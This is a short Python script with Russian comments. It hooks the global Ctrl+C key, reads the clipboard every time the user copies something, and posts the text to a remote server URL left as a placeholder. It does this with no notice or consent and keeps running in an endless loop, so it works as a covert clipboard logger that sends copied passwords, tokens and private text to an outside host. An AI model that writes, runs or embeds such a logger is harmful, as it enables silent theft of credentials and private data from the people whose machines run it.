import pyperclip
import requests
import keyboard

# URL вашего сервера
SERVER_URL = 'http://example_url/api/clipboard'  # Замените на ваш адрес

def send_data_to_server(data):
    try:
        requests.post(SERVER_URL, json={'clipboardData': data})
    except Exception as e:
        print(f'Ошибка при отправке данных: {e}')

def on_copy():
    current_text = pyperclip.paste()
    send_data_to_server(current_text)

# Устанавливаем обработчик события копирования
keyboard.add_hotkey('ctrl+c', on_copy)

# Бесконечный цикл для удержания скрипта в работе
keyboard.wait()
